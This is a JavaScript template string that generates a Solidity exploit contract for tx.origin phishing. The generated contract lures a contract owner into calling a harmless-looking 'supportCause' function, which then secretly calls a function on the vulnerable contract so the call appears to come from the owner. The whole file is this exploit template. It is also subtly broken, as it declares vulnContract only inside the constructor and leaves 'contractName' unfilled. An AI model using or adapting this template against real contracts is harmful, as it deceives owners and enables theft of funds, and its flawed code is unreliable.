let txOrigin_ExploitTemplate = 
`
//SPDX-License-Identifier:MIT
pragma solidity ^0.8;

${targetContract}

contract ExploitTxOrigin{

    uint public supportReceived = 0;

    constructor(address _vulnContract){
        contractName vulnContract = contractName(_vulnContract);
    }

    function supportCause () public payable {
        supportReceived++;

        // The unsuspecting user will think they are supporting a cause that does not ask for money
        // But in the background, the smart contract also calls the vulnerable contract's function with hardcoded values.
        // Effectively making it seem like the legitimate owner was the one who called the vulnerable contract.
        Exploit(${exploitfnParams});
    }

    function Exploit(${topLevelFnParams}) public payable {
        vulnContract.${funcName}(${exploitfnParams});
    }

    receive() external payable { }

    fallback() external payable { }
}
`